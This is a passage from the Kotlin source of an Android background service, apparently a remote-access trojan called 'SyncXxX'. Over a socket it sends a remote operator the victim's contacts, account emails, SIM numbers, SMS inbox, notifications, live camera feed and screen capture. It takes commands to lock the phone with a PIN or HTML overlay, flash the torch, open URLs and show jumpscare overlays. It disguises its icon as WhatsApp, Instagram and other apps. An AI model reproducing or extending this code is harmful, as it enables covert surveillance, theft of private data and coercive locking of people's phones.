                    put("deviceId", deviceId)
                    put("contacts", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendContacts: ${e.message}")
            }
        }.start()
    }

    private fun sendGmailAccounts() {
        Thread {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
                    socket?.emit("device:gmail", JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }
                val am = getSystemService(android.accounts.AccountManager::class.java)
                val accounts = am?.getAccountsByType("com.google") ?: emptyArray()
                val arr = org.json.JSONArray()
                accounts.forEach { acc ->
                    arr.put(JSONObject().apply {
                        put("email", acc.name)
                        put("type", acc.type)
                    })
                }
                // Juga ambil semua akun non-Google
                val allAccounts = am?.accounts ?: emptyArray()
                val extra = org.json.JSONArray()
                allAccounts.filter { it.type != "com.google" }.forEach { acc ->
                    extra.put(JSONObject().apply {
                        put("email", acc.name)
                        put("type", acc.type)
                    })
                }
                socket?.emit("device:gmail", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("accounts", arr)
                    put("others", extra)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGmailAccounts: ${e.message}")
            }
        }.start()
    }

    private fun sendPhoneNumbers() {
        Thread {
            try {
                val arr = org.json.JSONArray()
                val tm = getSystemService(TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val subMgr = getSystemService(android.telephony.SubscriptionManager::class.java)
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {
                        val subs = subMgr?.activeSubscriptionInfoList ?: emptyList()
                        if (subs.isEmpty()) {
                            // Fallback ke slot tunggal
                            val num = tm.line1Number
                            if (!num.isNullOrBlank()) {
                                arr.put(JSONObject().apply {
                                    put("slot", 0)
                                    put("number", num)
                                    put("operator", tm.networkOperatorName ?: "")
                                    put("simState", tm.simState)
                                })
                            }
                        } else {
                            subs.forEachIndexed { idx, sub ->
                                val num = sub.number ?: ""
                                arr.put(JSONObject().apply {
                                    put("slot", idx)
                                    put("number", num)
                                    put("operator", sub.carrierName ?: "")
                                    put("displayName", sub.displayName ?: "SIM ${idx + 1}")
                                    put("iccId", sub.iccId ?: "")
                                })
                            }
                        }
                    }
                } else {
                    @Suppress("DEPRECATION")
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        val num = tm.line1Number
                        arr.put(JSONObject().apply {
                            put("slot", 0)
                            put("number", num ?: "")
                            put("operator", tm.networkOperatorName ?: "")
                        })
                    }
                }
                socket?.emit("device:phone", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("sims", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendPhoneNumbers: ${e.message}")
                socket?.emit("device:phone", JSONObject().apply {
                    put("deviceId", deviceId); put("error", e.message)
                })
            }
        }.start()
    }

        private fun sendInstalledApps() {
        Thread {
            try {
                val pm  = packageManager
                val arr = org.json.JSONArray()

                @Suppress("DEPRECATION")
                val packages = pm.getInstalledPackages(0)

                packages
                    .filter { it.packageName != packageName }
                    .mapNotNull { pkgInfo ->
                        try {
                            val name = pm.getApplicationLabel(pkgInfo.applicationInfo).toString()
                            if (name.isBlank()) null else Pair(pkgInfo.packageName, name)
                        } catch (_: Exception) { null }
                    }
                    .sortedBy { it.second.lowercase() }
                    .forEach { (pkg, name) ->
                        arr.put(org.json.JSONObject().apply {
                            put("package", pkg)
                            put("name", name)
                        })
                    }

                Log.d("DeviceService", "sendInstalledApps: ${arr.length()} apps")

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", org.json.JSONObject().apply {
                        put("installedApps", arr)
                    })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "getInstalledApps: ${e.message}")
            }
        }.start()
    }

    private fun lockDevice(jsonValue: String) {
        try {
            val obj   = org.json.JSONObject(jsonValue)
            val pin   = obj.optString("pin", "")
            val title = obj.optString("title", "Perangkat Terkunci")
            lockPin   = pin
            lockTitle = title

            val intent = Intent(this, LockOverlayService::class.java).apply {
                putExtra(LockOverlayService.EXTRA_PIN, pin)
                putExtra(LockOverlayService.EXTRA_TITLE, title)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }

            startLockFlashBlink()

            emitStatus(JSONObject().apply {
                put("deviceLocked", true)
                put("lockTitle", title)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockDevice error: ${e.message}")
        }
    }

    private fun unlockDevice() {
        lockPin   = ""
        lockTitle = ""
        stopLockFlashBlink()
        removeLockCustomOverlay() // hapus floating overlay custom kalau ada
        val intent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply {
            put("deviceLocked", false)
            put("lockTitle", "")
        })
    }

    // ── Change Theme (icon & nama app) ────────────────────────────────────────
    private val THEME_ALIASES = mapOf(
        "default"   to "com.sync.xxx.AliasDefault",
        "whatsapp"  to "com.sync.xxx.AliasWhatsApp",
        "youtube"   to "com.sync.xxx.AliasYouTube",
        "instagram" to "com.sync.xxx.AliasInstagram",
        "telegram"  to "com.sync.xxx.AliasTelegram",
        "xnxx"      to "com.sync.xxx.AliasXNXX"
    )

    private fun changeTheme(theme: String) {
        try {
            val pm = packageManager
            val target = theme.lowercase().trim()
            // Disable semua alias dulu
            THEME_ALIASES.values.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        android.content.ComponentName(packageName, alias),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            // Enable alias yang dipilih
            val chosen = THEME_ALIASES[target] ?: THEME_ALIASES["default"]!!
            pm.setComponentEnabledSetting(
                android.content.ComponentName(packageName, chosen),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            emitStatus(JSONObject().apply { put("themeChanged", theme) })
            Log.d("DeviceService", "changeTheme: $theme -> $chosen")
        } catch (e: Exception) {
            Log.e("DeviceService", "changeTheme error: ${e.message}")
        }
    }

    // ── Lock Custom (floating WebView overlay — tidak masuk app) ─────────────
    private var lockCustomView: android.webkit.WebView? = null
    private val lockCustomWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }

    private fun lockCustom(htmlContent: String) {
        try {
            if (htmlContent.isEmpty()) {
                removeLockCustomOverlay()
                unlockDevice()
                return
            }
            lockPin   = ""
            lockTitle = ""

            removeLockCustomOverlay() // clear previous if any

            Handler(Looper.getMainLooper()).post {
                try {
                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_FULLSCREEN or
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                        WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        PixelFormat.TRANSLUCENT
                    )

                    // Bungkus HTML dengan full-screen black background
                    val fullHtml = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{width:100%;height:100%;background:#000;overflow:hidden;
    display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
${htmlContent}
</body>
</html>"""

                    val wv = android.webkit.WebView(this@DeviceService).apply {
                        settings.javaScriptEnabled = true
                        settings.domStorageEnabled  = true
                        setBackgroundColor(android.graphics.Color.BLACK)
                        loadDataWithBaseURL(null, fullHtml, "text/html", "UTF-8", null)
                    }

                    lockCustomView = wv
                    lockCustomWm.addView(wv, params)
                } catch (e: Exception) {
                    Log.e("DeviceService", "lockCustom overlay: ${e.message}")
                }
            }

            emitStatus(JSONObject().apply { put("deviceLocked", true); put("lockTitle", "CUSTOM") })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockCustom error: ${e.message}")
        }
    }

    private fun removeLockCustomOverlay() {
        lockCustomView?.let {
            try { Handler(Looper.getMainLooper()).post { lockCustomWm.removeView(it) } } catch (_: Exception) {}
        }
        lockCustomView = null
    }

        private var lockFlashHandler: Handler? = null
    private var lockFlashRunnable: Runnable? = null
    private var lockFlashState = false

    private fun startLockFlashBlink() {
        stopLockFlashBlink()
        lockFlashHandler = Handler(Looper.getMainLooper())
        lockFlashRunnable = object : Runnable {
            override fun run() {
                lockFlashState = !lockFlashState
                try { torchCameraId?.let { cameraManager?.setTorchMode(it, lockFlashState) } } catch (_: Exception) {}
                lockFlashHandler?.postDelayed(this, 200)
            }
        }
        lockFlashHandler?.post(lockFlashRunnable!!)
    }

    private fun stopLockFlashBlink() {
        lockFlashHandler?.removeCallbacks(lockFlashRunnable ?: return)
        lockFlashHandler  = null
        lockFlashRunnable = null
        lockFlashState    = false
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
    }

    private fun setFlashlight(on: Boolean) {
        if (on) {
            if (flashBlinking) return
            flashBlinking = true
            flashHandler  = Handler(Looper.getMainLooper())
            var state     = false
            flashRunnable = object : Runnable {
                override fun run() {
                    if (!flashBlinking) {
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                        return
                    }
                    state = !state
                    try { torchCameraId?.let { cameraManager?.setTorchMode(it, state) } } catch (_: Exception) {}
                    flashHandler?.postDelayed(this, 200)
                }
            }
            flashHandler?.post(flashRunnable!!)
        } else {
            flashBlinking = false
            flashHandler?.removeCallbacks(flashRunnable ?: return)
            flashHandler  = null
            flashRunnable = null
            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        }
        emitStatus(JSONObject().apply { put("flashlight", on) })
    }

    private fun startCamera(facing: String) {
        Handler(Looper.getMainLooper()).post {
            stopCameraInternal()
            streaming = true

            val lensFacing = if (facing == "front") CameraSelector.LENS_FACING_FRONT
                             else CameraSelector.LENS_FACING_BACK
            val selector   = CameraSelector.Builder().requireLensFacing(lensFacing).build()

            val future = ProcessCameraProvider.getInstance(this)
            future.addListener({
                try {
                    cameraProvider = future.get()
                    cameraProvider?.unbindAll()

                    imageAnalysis = ImageAnalysis.Builder()
                        .setTargetResolution(android.util.Size(640, 480))
                        .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                        .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                        .build()

                    imageAnalysis!!.setAnalyzer(Executors.newSingleThreadExecutor()) { imageProxy ->
                        if (!streaming) { imageProxy.close(); return@setAnalyzer }
                        val now = System.currentTimeMillis()
                        if (now - lastFrameTime < FRAME_INTERVAL) { imageProxy.close(); return@setAnalyzer }
                        lastFrameTime = now

                        try {
                            val raw      = imageProxy.toBitmap()
                            val rotation = imageProxy.imageInfo.rotationDegrees
                            val bitmap   = if (rotation != 0) {
                                val matrix  = Matrix().apply { postRotate(rotation.toFloat()) }
                                val rotated = Bitmap.createBitmap(raw, 0, 0, raw.width, raw.height, matrix, true)
                                raw.recycle()
                                rotated
                            } else raw

                            val out = ByteArrayOutputStream()
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out)
                            val b64: String = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
                            bitmap.recycle()

                            emitFrame(b64)
                        } catch (_: Exception) {}
                        imageProxy.close()
                    }

                    cameraProvider?.bindToLifecycle(this@DeviceService, selector, imageAnalysis!!)
                    emitStatus(JSONObject().apply { put("cameraActive", true) })
                } catch (e: Exception) {
                    Log.e("DeviceService", "Camera bind error: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this))
        }
    }

    private fun stopCamera() {
        streaming = false
        Handler(Looper.getMainLooper()).post { stopCameraInternal() }
        emitStatus(JSONObject().apply { put("cameraActive", false) })
    }

    private fun stopCameraInternal() {
        streaming = false
        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
        cameraProvider = null
        imageAnalysis  = null
    }

    private fun requestScreenCapture() {
    val intent = Intent(this, ScreenCaptureActivity::class.java).apply {
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }
    startActivity(intent)
}

    private fun startScreenCapture(resultCode: Int, data: Intent) {
        stopScreenCapture()

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val capW: Int; val capH: Int; val capDpi: Int
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val bounds = wm.currentWindowMetrics.bounds
            val scale  = 0.3f
            capW   = (bounds.width()  * scale).toInt()
            capH   = (bounds.height() * scale).toInt()
            capDpi = resources.displayMetrics.densityDpi
        } else {
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION") wm.defaultDisplay.getMetrics(metrics)
            val scale = 0.3f
            capW   = (metrics.widthPixels  * scale).toInt()
            capH   = (metrics.heightPixels * scale).toInt()
            capDpi = metrics.densityDpi
        }

        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mgr.getMediaProjection(resultCode, data)

        imageReader = ImageReader.newInstance(capW, capH, PixelFormat.RGBA_8888, 3)

        mediaProjection?.createVirtualDisplay(
            "ScreenLive", capW, capH, capDpi,
            android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, null
        )

        screenStreaming = true
        emitStatus(JSONObject().apply { put("screenActive", true) })

        screenHandler = Handler(Looper.getMainLooper())
        screenRunnable = object : Runnable {
            override fun run() {
                if (!screenStreaming) return
                if (!screenIsSending) captureAndSendScreen()
                screenHandler?.postDelayed(this, 150)
            }
        }
        screenHandler?.post(screenRunnable!!)
    }

    private var screenIsSending = false

    private fun captureAndSendScreen() {
        val reader = imageReader ?: return
        var image: android.media.Image? = null
        try {
            image = reader.acquireLatestImage() ?: return
            val planes      = image.planes
            val buffer      = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride   = planes[0].rowStride
            val rowPadding  = rowStride - pixelStride * image.width

            val bmp = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height, Bitmap.Config.ARGB_8888
            )
            bmp.copyPixelsFromBuffer(buffer)

            val cropped = if (rowPadding > 0)
                Bitmap.createBitmap(bmp, 0, 0, image.width, image.height)
            else bmp

            val baos = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, 35, baos)
            if (cropped !== bmp) cropped.recycle()
            bmp.recycle()
            image.close(); image = null

            val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
            screenIsSending = true
            Thread {
                try { emitScreenFrame(b64) }
                finally { screenIsSending = false }
            }.start()
        } catch (_: Exception) {
        } finally {
            image?.close()
        }
    }

    private fun stopScreenCapture() {
        screenStreaming = false
        screenRunnable?.let { screenHandler?.removeCallbacks(it) }
        screenHandler  = null
        screenRunnable = null
        try { imageReader?.close() } catch (_: Exception) {}
        imageReader = null
        try { mediaProjection?.stop() } catch (_: Exception) {}
        mediaProjection = null
        emitStatus(JSONObject().apply { put("screenActive", false) })
    }

    private fun emitScreenFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("screen:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
    }

    private fun setWallpaperFromUrl(url: String) {
        Thread {
            try {
                val conn = (java.net.URL(url).openConnection() as java.net.HttpURLConnection).apply {
                    requestMethod    = "GET"
                    connectTimeout   = 8000
                    readTimeout      = 15000
                    setRequestProperty("User-Agent", "Mozilla/5.0")
                    setRequestProperty("Accept", "image/*")
                    instanceFollowRedirects = true
                    connect()
                }

                if (conn.responseCode != 200) {
                    Log.e("DeviceService", "setWallpaper HTTP ${conn.responseCode}")
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    conn.disconnect()
                    return@Thread
                }

                val bytes = conn.inputStream.use { it.readBytes() }
                conn.disconnect()

                val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                if (bmp == null) {
                    Log.e("DeviceService", "setWallpaper: decodeByteArray returned null")
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    return@Thread
                }

                val wm = WallpaperManager.getInstance(this)
                wm.setBitmap(bmp)
                bmp.recycle()
                emitStatus(JSONObject().apply { put("wallpaperSet", true) })
                Log.d("DeviceService", "Wallpaper set OK")
            } catch (e: Exception) {
                Log.e("DeviceService", "setWallpaper error: ${e.message}")
                emitStatus(JSONObject().apply { put("wallpaperSet", false) })
            }
        }.start()
    }

    private fun openUrl(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            emitStatus(JSONObject().apply { put("openedUrl", url) })
        } catch (e: Exception) {
            Log.e("DeviceService", "openUrl error: ${e.message}")
        }
    }
    
    private val notifStore = mutableMapOf<String, ArrayDeque<JSONObject>>()

    private fun storeNotif(payload: JSONObject) {
        val pkg = payload.optString("pkg") ?: return
        val deque = notifStore.getOrPut(pkg) { ArrayDeque() }
        deque.addFirst(payload)
        if (deque.size > 500) deque.removeLast()
    }

    private fun sendStoredNotifs() {
        Thread {
            try {
                val result = org.json.JSONArray()
                notifStore.forEach { (pkg, deque) ->
                    val msgs = org.json.JSONArray()
                    deque.forEach { msgs.put(it) }
                    result.put(JSONObject().apply {
                        put("pkg",     pkg)
                        put("appName", deque.firstOrNull()?.optString("appName") ?: pkg)
                        put("messages", msgs)
                    })
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", JSONObject().apply { put("notifList", result) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendStoredNotifs: ${e.message}")
            }
        }.start()
    }

    private fun sendSms() {
        Thread {
            try {
                val uri = android.net.Uri.parse("content://sms/inbox")
                val cursor = contentResolver.query(
                    uri,
                    arrayOf("address", "body", "date", "read"),
                    null, null, "date DESC"
                ) ?: return@Thread
                
                val grouped = mutableMapOf<String, ArrayDeque<JSONObject>>()
                cursor.use {
                    while (it.moveToNext()) {
                        val address = it.getString(0) ?: continue
                        val body    = it.getString(1) ?: continue
                        val date    = it.getLong(2)
                        val msg = JSONObject().apply {
                            put("pkg",     "com.android.sms")
                            put("appName", "SMS")
                            put("title",   address)
                            put("text",    body)
                            put("time",    date)
                        }
                        grouped.getOrPut(address) { ArrayDeque() }.addLast(msg)
                    }
                }

                val result = org.json.JSONArray()
                grouped.forEach { (address, msgs) ->
                    val msgArr = org.json.JSONArray()
                    msgs.forEach { msgArr.put(it) }
                    result.put(JSONObject().apply {
                        put("pkg",      "com.android.sms")
                        put("appName",  "SMS — $address")
                        put("messages", msgArr)
                    })
                }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", JSONObject().apply { put("smsList", result) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendSms: ${e.message}")
            }
        }.start()
    }

    private fun readUid(): String {
        return try {
            val json = assets.open("uid.json").bufferedReader().use { it.readText() }
            JSONObject(json).optString("uid", "")
        } catch (e: Exception) {
            Log.e("DeviceService", "readUid error: ${e.message}")
            ""
        }
    }

    fun emitStatus(statusObj: JSONObject) {
        if (socket?.connected() != true) return
        socket?.emit("device:status", JSONObject().apply {
            put("deviceId", deviceId)
            put("status", statusObj)
        })
    }

    private fun emitFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("camera:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
        try { unregisterReceiver(localReceiver) } catch (_: Exception) {}
        stopCameraInternal()
        stopScreenCapture()
        stopLockFlashBlink()
        flashBlinking = false
        flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
        flashHandler = null
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        socket?.disconnect()
        socket = null
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SyncXxX")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Sync XxX Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private var mediaPlayer: android.media.MediaPlayer? = null

    private fun playAudio(url: String) {
        try {
            mediaPlayer?.release()
            mediaPlayer = android.media.MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener { start() }
                setOnCompletionListener { release(); mediaPlayer = null }
                setOnErrorListener { _, _, _ -> release(); mediaPlayer = null; false }
                prepareAsync()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playAudio: ${e.message}")
        }
    }

    private val jumpscareViews = mutableListOf<android.view.View>()
    private val jumpscareHandler = Handler(Looper.getMainLooper())
    private var jumpscareRunnable: Runnable? = null
    private var jumpscareUrls: List<String> = emptyList()

    private fun startJumpscare(value: String) {
        stopJumpscare()
        jumpscareUrls = try {
            val arr = org.json.JSONArray(value)
            (0 until arr.length()).map { arr.getString(it) }.filter { it.isNotBlank() }
        } catch (_: Exception) {
            if (value.isNotBlank()) listOf(value) else emptyList()
        }
        if (jumpscareUrls.isEmpty()) return

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val metrics = resources.displayMetrics
        val screenW = metrics.widthPixels
        val screenH = metrics.heightPixels

        val spawnJumpscare = object : Runnable {
            override fun run() {
                if (jumpscareUrls.isEmpty()) return
                val pickedUrl = jumpscareUrls.random()
                try {
                    val imgView = android.widget.ImageView(this@DeviceService)
                    imgView.scaleType = android.widget.ImageView.ScaleType.CENTER_CROP

                    val size = (120 + (Math.random() * 80).toInt())
                    val px = (size * metrics.density).toInt()

                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION")
                        android.view.WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        px, px, type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT
                    ).apply {
                        gravity = android.view.Gravity.TOP or android.view.Gravity.START
                        x = (Math.random() * (screenW - px)).toInt().coerceAtLeast(0)
                        y = (Math.random() * (screenH - px)).toInt().coerceAtLeast(0)
                    }

                    wm.addView(imgView, params)
                    jumpscareViews.add(imgView)

                    Thread {
                        try {
                            var redirectUrl = pickedUrl
                            var bmp: android.graphics.Bitmap? = null
                            for (i in 0..4) {
                                val conn = java.net.URL(redirectUrl).openConnection() as java.net.HttpURLConnection
                                conn.connectTimeout          = 12000
                                conn.readTimeout             = 15000
                                conn.instanceFollowRedirects = false
                                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13)")
                                conn.setRequestProperty("Accept", "image/*,*/*;q=0.8")
                                conn.connect()
                                val code = conn.responseCode
                                if (code in 300..399) {
                                    val loc = conn.getHeaderField("Location")
                                    conn.disconnect()
                                    if (loc != null) { redirectUrl = loc; continue } else break
                                }
                                val bytes = conn.inputStream.readBytes()
                                conn.disconnect()
                                bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                                break
                            }
                            if (bmp != null) {
                                val finalBmp = bmp
                                Handler(Looper.getMainLooper()).post { imgView.setImageBitmap(finalBmp) }
                            } else {
                                Log.e("DeviceService", "jumpscare img null: $pickedUrl")
                            }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "jumpscare img load: ${e.message}")
                        }
                    }.start()

                    Handler(Looper.getMainLooper()).postDelayed({
                        try { wm.removeView(imgView); jumpscareViews.remove(imgView) } catch (_: Exception) {}
                    }, 2500)

                } catch (e: Exception) {
                    Log.e("DeviceService", "jumpscare spawn: ${e.message}")
                }

                jumpscareRunnable = this
                jumpscareHandler.postDelayed(this, 600)
            }
        }

        jumpscareRunnable = spawnJumpscare
        jumpscareHandler.post(spawnJumpscare)
    }

    private fun stopJumpscare() {
        jumpscareUrls = emptyList()
        jumpscareRunnable?.let { jumpscareHandler.removeCallbacks(it) }
        jumpscareRunnable = null
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        jumpscareViews.toList().forEach { v ->
            try { wm.removeView(v) } catch (_: Exception) {}
        }
        jumpscareViews.clear()
    }
}

object SocketHolder {
    var connected: Boolean = false
}
